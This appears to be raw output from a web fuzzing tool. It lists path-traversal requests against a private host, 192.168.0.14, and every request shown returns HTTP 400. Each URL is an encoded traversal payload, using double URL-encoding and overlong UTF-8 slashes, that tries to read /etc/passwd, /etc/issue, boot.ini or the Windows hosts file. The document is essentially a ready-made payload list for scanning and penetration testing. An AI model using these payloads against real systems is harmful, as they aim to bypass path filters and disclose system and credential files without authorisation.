82,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
83,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
84,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
85,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
86,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
87,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
88,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
89,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
90,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
92,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
93,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255cboot.ini
94,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255cetc%255cissue
95,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255cetc%255cpasswd
96,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
98,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
99,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afpasswd
19,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
20,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
21,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66boot.ini
22,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66etc%%32%%66issue
23,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
